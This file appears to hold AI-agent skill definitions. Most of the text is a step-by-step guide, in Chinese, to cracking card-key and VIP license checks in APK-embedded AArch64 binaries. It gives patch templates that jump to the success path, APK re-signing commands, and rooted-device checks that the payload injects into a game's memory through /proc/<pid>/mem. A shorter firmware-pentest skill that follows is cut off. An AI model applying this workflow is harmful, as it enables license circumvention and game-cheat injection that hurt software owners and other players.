- skill_id: elf-local-auth-patcher
  domain: reverse
  description: Use when working on self-owned or authorized APK/ELF local test authorization, offline
    license replacement, card-key validation replacement, APK assets/bin ELF patching, AArch64 branch
    patching, loader/memfd execution-chain recovery, payload-trailer preservation, Android real-device
    verification, overlay-vs-injection diagnosis, driver-vs-proc-mem judgment, APK signing, or keeping
    patched ELF/APK executable and verifiable.
  body: "# ELF Local Auth Patcher 融合版\n\n作者：西宫公益频道@xigongPD  \n版本：2.3-fusion  \n定位：完整融合 1.0 的“最小本地授权 patch\
    \ + ELF 可执行性保护”与 2.0 的“APK→loader→payload ELF→真机验证→悬浮窗/driver/纯内存注入判定”方案。\n\n## 一句话原则\n\n不要为了跳过授权破坏业务链。先恢复真实调用链，再在最靠近授权决策的位置做等长\
    \ patch，并用文件级、APK 级、真机级证据证明后续功能链仍可执行。\n\n## 0. 适用边界\n\n用于自有项目或授权测试环境中的：\n\n```text\nAPK 内置 ELF 本地测试授权替换\n\
    卡密/授权/到期时间/离线测试模式 patch\nAArch64 授权分支 patch\nAPK assets/bin ELF 或 dat 替换\nmemfd/stdin loader payload\
    \ 恢复\nappended payload/trailer 保持\n真机 root 注入链验证\n悬浮窗、driver、纯内存注入模式判定\n```\n\n## 1. 1.0 硬约束：绝不能破坏的东西\n\
    \n这些约束优先级最高，任何 2.0 增强都不能覆盖：\n\n```text\n[ ] 不破坏 ELF Header\n[ ] 不破坏 Program Headers\n[ ] 不改 entry\
    \ point，除非任务明确要求且有完整验证\n[ ] 优先等长 in-place patch，不改变文件大小\n[ ] 不破坏 appended payload / magic / size trailer\n\
    [ ] 不改 payload 区域，除非任务明确要求\n[ ] APK 替换 assets 后必须删除旧 META-INF、zipalign、apksigner verify\n[ ] patch\
    \ 前 expected bytes 必须完全匹配\n[ ] patch 后必须验证 header、phdr、tail、hash、反汇编、运行行为\n[ ] 结论必须来自实际读取、反汇编、日志或真机检查\n\
    ```\n\n## 2. 成品工具优先\n\n本 skill 自带工具：\n\n```text\nscripts/xg_elf_tool.py\n```\n\n常用命令：\n\n```powershell\n\
    python <skill-dir>\\scripts\\xg_elf_tool.py --help\npython <skill-dir>\\scripts\\xg_elf_tool.py apk-inventory\
    \ target.apk --json-out _analysis\\apk_inventory.json\npython <skill-dir>\\scripts\\xg_elf_tool.py\
    \ elf-info payload.elf --json-out _analysis\\elf_info.json\npython <skill-dir>\\scripts\\xg_elf_tool.py\
    \ va2off payload.elf 0x10169a4\npython <skill-dir>\\scripts\\xg_elf_tool.py patch-bytes --input payload.elf\
    \ --output payload.patched.elf --va 0x10169a4 --expected-hex 11f7ff97 --patch-hex f8000014 --report\
    \ _analysis\\patch_report.json\npython <skill-dir>\\scripts\\xg_elf_tool.py apk-replace-entry --apk\
    \ in.apk --entry assets/bin/huazai.dat --replacement huazai.patched.dat --out unsigned.apk\npython\
    \ <skill-dir>\\scripts\\xg_elf_tool.py scan-text _analysis\\dex_classes --json-out _analysis\\signal_scan.json\n\
    python <skill-dir>\\scripts\\xg_elf_tool.py device-probe --app com.example.app --target com.example.game\
    \ --out-dir _analysis\\device_verify\n```\n\n工具覆盖：ELF 解析、VA→offset、expected-bytes patch、APK entry\
    \ 替换、关键词分类、adb 证据采集。复杂汇编生成可配合 keystone/capstone/IDA/r2。\n\n## 3. 标准产物目录\n\n每次分析都创建可复核产物：\n\n```text\n\
    _analysis/\n  apk_unzipped/\n  dex_classes/\n  strings/\n  payload_unpacked.elf\n  elf_info.json\n\
    \  patch_report.json\n  signal_scan.json\n  device_verify/\n  dist/\n```\n\n保存原始 hash：\n\n```powershell\n\
    Get-FileHash target.apk -Algorithm SHA256\nGet-FileHash payload.elf -Algorithm SHA256\n```\n\n## 4.\
    \ APK 盘点与真实启动链恢复\n\n先分析 APK，不要直接运行 assets 里的 ELF 下结论。\n\nAPK 重点：\n\n```text\nAndroidManifest.xml\n\
    classes.dex / split dex\nassets/bin/*\nassets/*.html / JS Bridge\nlib/*/*.so\nMETA-INF/\n```\n\n搜索\
    \ Java/Kotlin 调用链：\n\n```text\nRuntime.exec ProcessBuilder su -c sh -c chmod codeCacheDir filesDir\n\
    getAssets openRawResource assets/bin\nBufferedReader InputStreamReader stdout stderr stdin\nexport\
    \ getenv HUAZAI_KAMI INNER_KAMI\ncat | /proc/self/fd memfd_create fexecve execveat execv\n```\n\n\
    典型 2.0 真实模型：\n\n```text\nWebView/Activity/JS Bridge\n  -> 保存 config\n  -> 读取卡密和功能开关\n  -> 解密 assets/bin/xxx.dat\n\
    \  -> 释放 assets/bin/st 到 codeCacheDir/.st\n  -> chmod 700/755\n  -> su shell: export KEY=... && cat\
    \ | .st argv...\n  -> st 从 stdin 读 payload ELF\n  -> memfd_create / fexec / execveat\n  -> payload\
    \ ELF 执行授权和后续功能链\n```\n\n如果直接运行 ELF 无输出、崩溃或行为不对，优先检查 env、argv、stdin payload、root shell、工作目录和 loader。\n\
    \n## 5. 授权流程识别\n\n同时从 dex 与 ELF 搜索：\n\n```text\nkami card key license vip code time expire markcode\
    \ sign token\nhttp https POST GET Content-Type JSON code==200 vip>=1\nauth login notice server\n验证成功\
    \ 验证失败 卡密不存在 到期时间 授权成功\npayload driver memfd exec /proc/self/fd\n```\n\n逆向推进顺序：\n\n```text\n失败字符串\
    \ xref       -> auth_fail\n成功字符串 xref       -> auth_success / success_init\n网络请求/JSON xref    -> request/parse/check\n\
    argv/env/config xref   -> 参数初始化\npayload/driver xref    -> 成功后的功能链\n/proc/maps/mem xref    -> 注入链\n\
    ```\n\n优先命名函数：\n\n```text\nmain_or_dispatch\nauth_request\nauth_parse_response\nauth_fail\nauth_success_init\n\
    parse_argv_or_config\nloader_or_memfd_exec\nfind_target_pid\nfind_module_base\nwrite_target_memory\n\
    run_feature_chain\n```\n\n## 6. 最稳 patch 点选择\n\n1.0 的核心成功模型必须保留：选择“远端授权请求返回之后、响应解析或失败分支之前”的最小位置。\n\
    \n### 6.1 状态生产型判定门\n### 6.2 比较函数语义与回跳目标判定\n在改写 `isVip` / `vip` / `code` 分支前，必须反汇编比较包装函数并建立 `equal`、`not\
    \ equal`、零值和非零值的真值表。\n不能按函数名或 `true` 字符串猜测返回语义：比较包装层可能返回不等（例如 `1 & ~equal`），这会使 `tbnz` 的非零分支成为清理回退。\n\
    对每个候选分支记录：比较结果寄存器、条件指令、跳转目标、落空块、以及二者各自的析构、资源检查、功能 UI 或主菜单返回行为。\n只有跳转目标已证实为授权失败清理，且落空块进入原有功能链时，才允许将该\
    \ `tbnz` / `cbnz` 改为 `nop`。\n若成功路径由 `tbz` 落空或目标进入，不能机械替换为 `nop`；应将结果寄存器置为正确值，或跳转到已验证的功能块。\n最终需对每个子菜单做运行时回归，并把\
    \ Pak、配置、资源或用户取消导致的正常回退与授权失败回退分开记录。\n\n当同一响应同时含有 `token`、`endTime`、用户名/设备状态等成功状态字段，以及 `vip`、`isVip`、`code`\
    \ 等单一判定字段时，先按角色分层：\n\n```text\n传输/协议错误（connect、HTTP、Error） -> 保留失败处理，不作为 patch 点\n状态字段（token、endTime、cache）\
    \    -> 必须先完成解析，且保留原 success_init 写入\n判定字段（vip、isVip、code）          -> 只改其后的唯一条件分支，跳原 success_init\n\
    充值/卡密回退（recharge、card input） -> 仅是失败路径；不要伪造其返回值替代状态初始化\n```\n\n确认该模式的证据链：调用方收到成功返回后是否继续执行功能链；成功块是否写\
    \ context/cache/expiry；失败块是否进入卡密输入或充值接口；跳转目标是否支配这些状态写入。若成功块依赖保存寄存器或栈对象，跳转必须落在保存动作之后，不能直接跳函数尾。\n\n\
    对付费功能或子菜单，不能因为入口认证已 patch 就停止追踪。枚举该功能函数及其直接子调用中的全部 `request -> parse(vip/code) -> compare -> conditional\
    \ exit` 链；每个判定门都单独记录 VA、expected bytes、失败目标和成功续接块。仅 patch 已确认会直接清理并返回上层菜单的授权分支，保留请求失败、协议异常、资源释放和非授权业务错误分支。\n\
    \n推荐逻辑：\n\n```text\n原逻辑：\n  init argv/env/config\n  request_remote_auth()\n  if request failed ->\
    \ fail\n  parse code/time/vip\n  if ok -> success_init\n  else -> fail\n  success_init -> payload/driver/function\
    \ chain\n\nPatch 后：\n  init argv/env/config\n  request_remote_auth()      # 可保留，也可只跳过 notice/auth\
    \ 子请求\n  restore success-path registers / stack vars\n  set local_test_expiry      # 2030/2035，仅本地测试显示或日志\n\
    \  branch success_init\n```\n\n成功路径选择：\n\n```text\n跳 success_init：优先，保留后续初始化。\n跳 success_tail：高风险，可能漏初始化导致\
    \ SIGSEGV。\n跳 main exit/return：通常错误，会破坏 payload/driver/功能链。\n改 ELF header/entry：常规禁止。\n```\n\nAArch64\
    \ 模板：\n\n```asm\n// 条件失败分支改无条件成功\nb success_init\n\n// 清空失败跳转\nnop\n\n// 本地测试时间戳 + 跳转\nmovz x0, #LOW16\n\
    movk x0, #HIGH16, lsl #16\nb success_init\n\n// 恢复成功路径依赖\nldr x19, [sp, #argv_save]\nldr w22, [sp,\
    \ #argc_save]\nb success_init\n```\n\n时间戳计算：\n\n```python\nimport datetime\nfor y in [2030, 2035]:\n\
    \    e = int(datetime.datetime(y, 1, 1, tzinfo=datetime.UTC).timestamp())\n    print(y, e, hex(e),\
    \ e & 0xffff, (e >> 16) & 0xffff)\n```\n\n## 7. 1.0 patch 脚本强制验证\n\nPatch 脚本必须：\n\n```text\n[ ] 读取\
    \ ELF\n[ ] 解析 PT_LOAD\n[ ] VA 映射 file offset\n[ ] expected bytes 完全匹配\n[ ] patch 长度等于覆盖长度\n[ ] 写新文件，不覆盖原始文件\n\
    [ ] 计算 SHA256\n[ ] 验证 ELF Header 未变\n[ ] 验证 Program Headers 未变\n[ ] 验证 entry point 未变\n[ ] 验证 file\
    \ size 未变\n[ ] 验证 patch bytes 反汇编符合预期\n```\n\nVA→offset：\n\n```python\ndef va_to_off(segments, va):\n\
    \    for s in segments:\n        if s['p_type'] == 1:\n            start = s['p_vaddr']\n        \
    \    end = start + s['p_filesz']\n            if start <= va < end:\n                return s['p_offset']\
    \ + (va - start)\n    raise ValueError('VA not in PT_LOAD')\n```\n\n## 8. appended payload / trailer\
    \ 保护\n\n很多 APK 内置 ELF 有尾部 payload，不一定是纯标准 ELF。常见结构：\n\n```text\n[ELF body][payload bytes][payload_size:uint64_le][magic:8/16\
    \ bytes]\n```\n\n验证模板：\n\n```python\nimport struct\n\ndef check_tail(original, patched, magic=b'LLGATE1\\\
    0'):\n    tail = original[-16:]\n    size = struct.unpack('<Q', tail[:8])[0]\n    mg = tail[8:]\n\
    \    off = len(original) - 16 - size\n    assert mg == magic\n    assert off >= 0\n    assert original[off:]\
    \ == patched[off:]\n```\n\n如果 magic、payload_size、payload_offset 或 payload 区域改变，立即回滚。\n\n## 9. APK\
    \ 替换、对齐、签名\n\n替换 APK assets 中的 ELF/dat：\n\n```text\n[ ] 复制原 APK 为 unsigned 工作副本\n[ ] 替换指定 entry，例如\
    \ assets/bin/xxx.dat\n[ ] 删除 META-INF/ 旧签名\n[ ] zipalign\n[ ] apksigner sign\n[ ] apksigner verify\
    \ --verbose --print-certs\n[ ] 从最终 APK 抽出 entry，与 patched 文件 hash 比对\n```\n\n命令模板：\n\n```powershell\n\
    & \"$env:LOCALAPPDATA\\Android\\Sdk\\build-tools\\37.0.0\\zipalign.exe\" -f -p 4 input.unsigned.apk\
    \ output.aligned.apk\n& \"$env:LOCALAPPDATA\\Android\\Sdk\\build-tools\\37.0.0\\apksigner.bat\" sign\
    \ --ks localtest-debug.keystore --ks-pass pass:android --key-pass pass:android --out output.apk output.aligned.apk\n\
    & \"$env:LOCALAPPDATA\\Android\\Sdk\\build-tools\\37.0.0\\apksigner.bat\" verify --verbose --print-certs\
    \ output.apk\n```\n\n本地测试 key：\n\n```powershell\nkeytool -genkeypair -v -keystore localtest-debug.keystore\
    \ -storepass android -keypass android -alias localtest -keyalg RSA -keysize 2048 -validity 10000 -dname\
    \ \"CN=LocalTest,O=LocalTest,C=CN\"\n```\n\n## 10. 真机验证链\n\n不要只看前端 UI 的 2030/2035。ELF 才可能是真正授权入口。\n\
    \n基础检查：\n\n```powershell\nadb devices -l\nadb shell getprop ro.product.model\nadb shell getprop ro.build.version.release\n\
    adb shell getprop ro.product.cpu.abi\nadb shell su -c id\nadb shell pm path <app.package>\nadb shell\
    \ appops get <app.package> SYSTEM_ALERT_WINDOW\n```\n\n启动与抓证：\n\n```powershell\nadb logcat -c\nadb\
    \ shell am force-stop <app.package>\nadb shell am force-stop <target.package>\nadb shell monkey -p\
    \ <app.package> -c android.intent.category.LAUNCHER 1\nadb logcat -d -v time > _analysis\\device_verify\\\
    run_logcat.txt\ncmd /c \"adb exec-out screencap -p > _analysis\\device_verify\\screen.png\"\nadb shell\
    \ uiautomator dump /sdcard/window.xml\nadb pull /sdcard/window.xml _analysis\\device_verify\\window.xml\n\
    ```\n\n目标进程链：\n\n```powershell\nadb shell su -c \"pidof <target.package>\"\nadb shell su -c \"ps -A\
    \ | grep <target.package>\"\nadb shell su -c \"cat /proc/<PID>/cmdline | tr '\\0' ' '\"\nadb shell\
    \ su -c \"grep libUE4.so /proc/<PID>/maps | head -n 5\"\nadb shell su -c \"ls -l /proc/<PID>/mem\"\
    \n```\n\nPowerShell/adb 中不要写复杂 inline `for ... do`；复杂监控写临时 sh 后 push 到设备执行。\n\n日志关键词：\n\n```text\n\
    验证成功 验证失败 卡密不存在\n窗口化本程序 等待游戏启动 游戏已启动 PID\nUE4模块加载超时 进程不可访问\n注入成功 注入失败 补丁失败\n所有功能注入完成 所有功能执行完成\nSegmentation\
    \ fault Fatal signal SIGSEGV\n```\n\n## 11. 功能链卡点决策树\n\n```text\n前端显示长期授权，但 ELF 报“卡密不存在”\n  -> 只 patch\
    \ 了 UI/Java；回到 ELF 授权入口。\n\n授权过了但 SIGSEGV\n  -> 跳过 success_init；改跳更早成功初始化块，恢复寄存器/栈变量。\n\n输出“窗口化本程序/等待游戏启动”，但无后续\n\
    \  -> 授权已过；查目标包名、argv[1]、pidof、cmdline。\n\npidof 有 PID，但 ELF 找不到\n  -> 检查扫描逻辑、多进程、cmdline 匹配。\n\n\
    游戏已启动，但 UE4 超时\n  -> 查 /proc/<pid>/maps，模块名/加载时机/等待时长。\n\nUE4 找到，但进程不可访问或注入失败\n  -> 查 root 上下文、SELinux、/proc/<pid>/mem\
    \ 权限、pwrite 返回值。\n\n注入成功但功能无效\n  -> 功能链跑通；查目标版本偏移、基址计算、写入字节、开关参数。\n```\n\n## 12. 悬浮窗、driver、纯内存注入判定\n\
    \n不要把“没看到悬浮窗/刷入动画”直接判为 ELF 失败。\n\n分类：\n\n```text\nWebView 配置前端：assets/index.html + JS Bridge，只负责配置。\n\
    Java 状态提示窗：WindowManager + TextView，只显示启动/完成提示。\n游戏内功能菜单：Canvas/SurfaceView/GLSurfaceView/Overlay\
    \ Service/native draw loop。\n纯内存注入：root 打开 /proc/<pid>/mem，按模块基址写补丁。\ndriver 链：insmod/modprobe、.ko、/dev/*、sysfs/procfs、Magisk/KernelSU、ioctl。\n\
    ```\n\n静态搜索：\n\n```text\nSYSTEM_ALERT_WINDOW WindowManager TYPE_APPLICATION_OVERLAY TYPE_PHONE addView\
    \ removeView TextView\nService overlay Canvas SurfaceView GLSurfaceView OpenGL setOnTouchListener\n\
    /proc/%d/mem pwrite process_vm_writev ptrace libUE4.so maps cmdline pidof\ninsmod modprobe .ko /dev/\
    \ ioctl sysfs magisk ksu\n```\n\n判定：\n\n```text\nTextView + WindowManager.addView\n  -> 状态提示窗，不是功能菜单。\n\
    \n/proc/<pid>/mem + maps + pwrite\n  -> 纯内存注入，不存在传统 driver 刷入过程。\n\n.ko / insmod / ioctl / /dev 节点\n\
    \  -> 进入 driver 链分析。\n```\n\n## 13. 推荐工具链\n\n```text\nAPK/dex: apktool, jadx, dexdump, aapt/aapt2\n\
    ELF 静态: file, readelf, objdump, nm, strings, r2/rizin, IDA Pro + MCP\nELF patch: Python, pyelftools,\
    \ lief, capstone, keystone, xg_elf_tool.py\nAndroid: adb, logcat, dumpsys, uiautomator, screencap,\
    \ appops\n动态: strace, ltrace, frida, gdbserver（按环境选择）\n签名: zipalign, apksigner, keytool\n```\n\nIDA/r2\
    \ 顺序：\n\n```text\n1. survey / strings / imports\n2. xref 授权失败、授权成功、payload、/proc 字符串\n3. 反编译 main/auth/loader/write-memory\
    \ 函数\n4. 标注关键 basic block\n5. patch 前保存 expected bytes 和上下文\n```\n\n动态优先抓边界：\n\n```text\nopenat/read\
    \ config/assets\nexecve/fexecve/memfd_create\npidof / procfs 扫描\nopenat /proc/<pid>/maps\nopenat /proc/<pid>/mem\n\
    pwrite64/process_vm_writev/ioctl\n```\n\n## 14. 1.0 已验证成功模式\n\n```text\n登录请求返回后：\n  cbnz w0, fail_network\n\
    \  parse \"code\"\n  cmp code, #200\n  parse \"time\"\n  compare abs(server_time - local_time) < 11\n\
    \  parse \"vip\"\n  if vip >= 1 -> success\n\nPatch：\n  在 request 返回后的第一条失败分支处覆盖为：\n    restore argv/argc\n\
    \    mov x0, local_test_expiry\n    b success_path_or_success_init\n```\n\n这个模式最大限度保留 ELF 可执行性和业务执行链，只替换授权决策。\n\
    \n## 15. 失败处理与回滚\n\n遇到以下情况停止并回滚：\n\n```text\nexpected bytes 不匹配\nVA 无法映射到 PT_LOAD\npatch 长度不等长\nELF\
    \ Header 改变\nProgram Headers 改变\nentry point 意外改变\npayload magic 改变\npayload offset/size 改变\nAPK 签名验证失败\n\
    成功路径依赖的寄存器/栈变量无法确认\n真机出现 SIGSEGV 且无法定位 success_init\n```\n\n保留原始文件、patch 尝试文件、失败报告 JSON、反汇编上下文和 logcat。\n\
    \n## 16. 输出格式\n\n```text\nPatch 后 ELF:\n<absolute path>\n\nPatch 后 APK:\n<absolute path>\n\nPatch\
    \ 点:\nVA=<addr>\nFileOffset=<offset>\nOldBytes=<hex>\nNewBytes=<hex>\nDisasm=<expected asm>\n\n原始\
    \ SHA256:\n...\n\nPatch SHA256:\n...\n\n验证:\nVERIFY_OK / VERIFY_FAIL\n\n已验证项:\n[ ] expected bytes\
    \ match\n[ ] ELF header unchanged\n[ ] Program Headers unchanged\n[ ] entry point unchanged\n[ ] file\
    \ size unchanged\n[ ] payload/trailer unchanged\n[ ] APK signed and verified\n[ ] installed on Android\n\
    [ ] real stdout/logcat confirms success path\n[ ] target PID/module/mem chain verified\n\n注意:\n说明是否完成真机验证；若未完成，列出下一条可运行命令。\n\
    ```\n\n## 17. 常见错误速查\n\n| 现象 | 原因 | 修复 |\n|---|---|---|\n| UI 过期时间正常但 ELF 失败 | 只 patch 前端/Java | 找\
    \ payload ELF 授权入口 |\n| patch 后 SIGSEGV | 跳过 success_init | 改跳成功初始化块 |\n| ELF 直接运行无输出 | 缺 loader/stdin/env/argv/root\
    \ | 恢复 APK 调用链 |\n| 找不到目标进程 | 包名/服务区/多进程不匹配 | 查 argv、pidof、cmdline |\n| UE4 超时 | maps 模块名变化或加载延迟 |\
    \ 查 maps，必要时延长等待 |\n| 没有功能悬浮窗 | 样本可能只有状态提示窗 | 按第 12 节分类 |\n| 说有 driver 但无刷入 | 实际是 /proc/<pid>/mem\
    \ | 搜索 .ko/insmod/ioctl 证据 |\n| APK 安装失败 | 旧签名/未对齐/签名版本 | 删除 META-INF、zipalign、apksigner |\n| adb\
    \ inline shell 报 do 语法错 | PowerShell 引号破坏 | 分步命令或 push 临时 sh |\n\n## 18. 交付准则\n\n每个阶段留下可复核制品：hash、反汇编、patch\
    \ report、签名验证、logcat、截图、UI dump、PID/maps/mem 检查。没有真机验证时只输出“静态 VERIFY_OK，动态待验证”，不要声称运行成功。\n\n## 19.\
    \ 子 skill 路由：Ash-12 类 ELF 完整处理分支\n\n遇到 Ash-12 类 Android AArch64 ELF 脚本时，先阅读并按需采用：\n\n`subskills/ash12-elf-complete-flow/SKILL.md`\n\
    \n触发特征包括：文件名或扩展名像 `.sh` 但实际是 ELF；尾部存在 `AEDEVPK1` 或类似 magic 的 appended payload/trailer；外层 loader 自读\
    \ `/proc/self/exe` 并解密 payload；外层存在 `kami/markcode/sign/code/time/vip` 远程授权门；成功路径写 `/data/local/tmp/card`\
    \ 后通过 `memfd_create`、`/proc/self/fd/%d` 或落地临时文件执行 payload；内层再出现 `/proc/%d/mem`、`libUE4.so`、`.ko`、`/dev/*`、`ioctl`\
    \ 等后续功能链。\n\n该子 skill 只作为 ELF 分析时的方案选择与案例化流程参考，不替代本主 skill 的硬约束。所有结论仍必须来自当前实际读取的文件、hash、反汇编、patch\
    \ report、stdout/logcat 或设备状态；尤其不要把过往真机连接调试后的记忆当作动态验证结论复用。\n\n## 20. APK 双载荷门控样本通杀补充\n\n遇到“WebView\
    \ 配置前端 + assets/bin 门控 ELF + assets/bin 驱动脚本/压缩载荷”的同类型样本时，按本节补充识别与处理；若与前文硬约束冲突，永远以前文为准。\n\n典型特征：\n\
    \n```text\nassets/bin/ 下至少两个高价值文件：\n  gate ELF：AArch64 ET_DYN，负责卡密/公告/时间/vip 判断，再执行后续 payload\n  driver\
    \ 入口：文件头可能像 shell，自解压后执行内核/驱动/写内存链\n\nJava/Kotlin 层：\n  WebView + JavascriptInterface/Bridge\n  saveConfig\
    \ 写入 filesDir/config\n  flashDriver(index) -> TMPDIR=/data/adb sh <driver> <index>\n  startModule(index)\
    \ -> <gate ELF> <card> <index>\n  原启动常见 nohup + 重定向日志 + 后台 &\n\n前端层：\n  DRIVER_OPTIONS / driverIndex\
    \ / 选择驱动弹窗\n  fetchNotice / queryCardExpiry / startModule / flashDriver\n  UI 状态文本不等同于 native 授权真实通过\n\
    \nnative gate：\n  字符串含 kami/markcode/sign/code/time/vip/msg/gg/app_gg\n  登录请求后先 cbnz/cbz 到失败，再解析 code/time/vip\n\
    \  成功块之后继续 memfd/execv/driver/功能链\n  文件可能带 appended payload，patch 不得碰尾部区域\n```\n\n通杀流程：\n\n```text\n\
    1. APK 盘点：列 zip entry、hash assets/bin/*、抽出 index.html 与 dex/jadx。\n2. 恢复调用链：从 Bridge 找 saveConfig/startModule/flashDriver，不要直接猜\
    \ argv。\n3. 记录接口：确认 gate ELF 的 argv[1]=卡密、argv[2]=驱动 index；确认 driver 的 index 范围。\n4. ELF 定位：用失败/成功/公告/key\
    \ 字符串 xref 找主 gate 函数。\n5. 授权 patch：优先在远端请求返回后的第一条失败分支改跳本地 success shim。\n6. shim 要恢复成功路径依赖寄存器/栈变量，再设置本地测试到期时间并跳\
    \ success_init。\n7. 公告本地化：若要移除远程公告，不要删函数；在公告 key 请求前后改为向原响应缓冲写固定文本，再跳回原打印/解析路径。\n8. 每个 patch 均做 expected\
    \ bytes、VA->offset、等长、header/phdr/entry/size/tail 验证。\n9. APK 或分离产物交付前，必须重新验证最终嵌入文件 hash 与 patch 后\
    \ ELF/driver hash 一致。\n```\n\n公告本地化的稳妥模式：\n\n```text\n原逻辑：\n  build notice request(key=\"gg\" 或 \"\
    app_gg\")\n  request_remote()\n  parse \"msg\"\n  print_notice_or_show_ui()\n\n推荐 patch：\n  找同函数内的公告请求分支，不影响卡密授权请求。\n\
    \  复用原 stack buffer，例如 sp+notice_buf。\n  用 snprintf/memcpy 写入固定公告文本。\n  直接跳回原 notice print / unescape\
    \ / UI 回调路径。\n\n禁止：\n  改 ELF entry。\n  删除整个网络函数。\n  复用授权成功 shim 处理公告。\n  写入超过 cave/buffer 长度的公告。\n\
    ```\n\n版本迁移注意：\n\n```text\n不要跨版本复用 offset。\n旧版本 patch 只能作为模式参考；必须重新匹配 expected bytes。\n若同一字符串有多处 xref，优先选择“授权请求返回后、失败分支前”的最小\
    \ patch 点。\n若 driver 入口是 shell+gzip 自解包，先保持原文件字节不变，只改变外层调用方式。\n```"
  source: elf-local-auth-patcher
  path: elf-local-auth-patcher/SKILL.md
- skill_id: firmware-pentest
  domain: iot
  description: '固件 / IoT 渗透链。从拿到一坨 .bin / .img 开始，闭环走完逆向 → 提取 → 模拟 → 利用。

    方法论遵循 OWASP FSTM 九阶段；工具链以 binwalk v3、unblob、EMBA、Firmadyne、AFL++ 为主。

    适用场景：路由器/摄像头/智能家居固件审计、固件升级包逆向、IoT CVE 复现、嵌入式 0day 挖掘。

    触发关键词：固件、firmware、IoT、binwalk、unblob、UART、JTAG、squashfs、UBI、JFFS2、Firmadyne、QEMU 全系统仿真、EMBA、固件渗透、路由器固件、嵌入式漏洞利用、bootloader、NVRAM、FAT、firmware
    analysis toolkit。'
  body: "# 固件 / IoT 渗透链 (Firmware Pentest)\n\n## 适用范围\n\n下列任务进入本 skill：\n\n1. **拿到一份固件文件**（.bin / .img\
    \ / .trx / .chk / OTA zip），需要从零到 RCE\n2. **路由器/摄像头/IoT 设备审计** — 需要批量发现已知 CVE 和未公开漏洞\n3. **加密/打包固件**，需要找\
    \ bootloader 解密例程或硬件 dump\n4. **需要在不接触硬件的情况下跑起来**（QEMU 全系统仿真 / Firmadyne / FAT）\n5. **对仿真起来的服务做 fuzz**（AFL++\
    \ qemu mode / boofuzz）\n6. **硬件接口接入**（UART / JTAG / SPI flash dump）\n\n### 与其他 skill 分工\n\n| 场景 |\
    \ 用什么 |\n|------|--------|\n| 从零拿到固件，全链路走 FSTM | **本 skill** |\n| 只做单个 ELF/so 静态逆向 | `reverse-engineering/`、`ida-reverse/`、`radare2/`\
    \ |\n| 仿真起来后做 Web/RCE 利用 | `pentest-tools/`、`attack-chain/` |\n| 硬件接口（UART/JTAG/SPI）实操 | 本 skill 的\
    \ Stage 2 章节 + `patterns-hardware.md` |\n| APK / Android 固件（含 boot.img） | `apk-reverse/`（先剥 boot.img\
    \ 再用本 skill） |\n| 跨版本固件符号迁移 | `binary-diff/` |\n\n## 核心原理\n\n```text\n固件 .bin\n   │\n   ├─ Stage 1-3:\
    \ 信息收集 / 获取 / 静态分析（不解压也能看的部分）\n   │\n   ├─ Stage 4: 提取文件系统  ← binwalk v3 / unblob / jefferson / ubi_reader\n\
    \   │     │\n   │     └─ 失败 → 找 bootloader 解密例程 / UART dump / SPI flash 硬件读\n   │\n   ├─ Stage 5:\
    \ 文件系统静态分析  ← EMBA 自动化 + 手工 grep\n   │\n   ├─ Stage 6: 模拟运行  ← Firmadyne / FAT / qemu-user-static\
    \ + chroot\n   │\n   ├─ Stage 7-8: 动态 / 运行时分析  ← gdb-multiarch、IDA 远程调试、Ghidra\n   │\n   └─ Stage\
    \ 9: 二进制利用  ← AFL++ fuzz / 手工 PoC / ARM / MIPS payload\n```\n\n关键判断：\n- 提取失败不等于固件加密，先把 binwalk v2、binwalk\
    \ v3、unblob、jefferson、ubi_reader 全跑一遍\n- EMBA 一行命令出 HTML 报告，能省 80% 体力，剩 20% 是真正的漏洞挖掘\n- 仿真起不来时优先怀疑\
    \ NVRAM 缺失、网卡名错配、`/dev/` 节点缺失\n- ARM / MIPS payload 必须区分大小端（mipsel vs mipseb），别用错\n\n## OWASP FSTM\
    \ 九阶段工作流\n\n### Stage 1 — 信息收集（Information Gathering）\n\n收集型号、芯片、SDK、已公开 CVE。\n\n```bash\n# FCC ID\
    \ 查询（美区设备）\ncurl -s \"https://fccid.io/?q=$FCC_ID\"\n\n# 芯片识别参考点\necho \"Realtek RTL8197 / Broadcom\
    \ BCM / MediaTek MT76 / Qualcomm IPQ\"\n```\n\n输出：芯片型号、SDK 来源（SDK 决定 binwalk 能否一把成功）。\n\n### Stage\
    \ 2 — 获取固件（Obtaining Firmware）\n\n四条路：官网下载、OTA 抓包、UART 落 shell 后 dump、SPI flash 物理读。\n\n```bash\n\
    # OTA 抓包后批量下载\nmitmdump -s save_response.py\n\n# UART 接入（USB-TTL，常用波特率 57600 / 115200）\npicocom -b\
    \ 115200 /dev/ttyUSB0\n\n# SPI flash 用 CH341A + flashrom 读\nflashrom -p ch341a_spi -r dump.bin\n```\n\
    \n### Stage 3 — 分析固件（Analyzing Firmware）\n\n不解压先看头部、熵、字符串、可识别签名。\n\n```bash\nbinwalk firmware.bin\
    \              # magic 扫描\nbinwalk -E firmware.bin           # 熵图，高熵段=压缩/加密\nstrings -n 8 firmware.bin\
    \ | less  # banner / 内核版本 / 路径\nfile firmware.bin\nhexdump -C firmware.bin | head -64\n```\n\n###\
    \ Stage 4 — 提取文件系统（Extracting Filesystem）\n\n详见 `references/extraction-methodology.md`。\n\n```bash\n\
    binwalk -eM firmware.bin           # 递归提取\nunblob -d out/ firmware.bin        # 处理 binwalk 失败的格式\n\
    jefferson rootfs.jffs2 -d rootfs/  # JFFS2\nubireader_extract_files rootfs.ubi # UBI\n```\n\n### Stage\
    \ 5 — 静态分析文件系统（Filesystem Analysis）\n\nEMBA 一键扫，详见 `references/emba-automated-analysis.md`。\n\n```bash\n\
    sudo emba -l ./logs -f ./firmware.bin -p ./scan-profiles/default-scan.emba\n```\n\n手工补：\n\n```bash\n\
    grep -rE \"(password|passwd|admin|secret|api_key|token)=\" squashfs-root/\nfind squashfs-root/ -name\
    \ \"*.conf\" -o -name \"*.ini\" -o -name \"shadow\"\nchecksec --file=squashfs-root/usr/sbin/httpd\n\
    ```\n\n### Stage 6 — 模拟运行（Emulating Firmware）\n\n详见 `references/emulation-and-fuzz.md`。\n\n```bash\n\
    # 用户态：跑单个 binary\nqemu-mipsel-static -L squashfs-root/ squashfs-root/usr/sbin/httpd\n\n# 全系统：FAT（Firmadyne\
    \ 封装版）\nsudo fat.py firmware.bin\n```\n\n### Stage 7 — 动态分析（Dynamic Analysis）\n\n仿真起来后挂调试器、抓流量、跑 fuzz。\n\
    \n```bash\n# gdb 远程调试 MIPS\nqemu-mipsel-static -g 1234 ./vuln_binary\ngdb-multiarch ./vuln_binary\
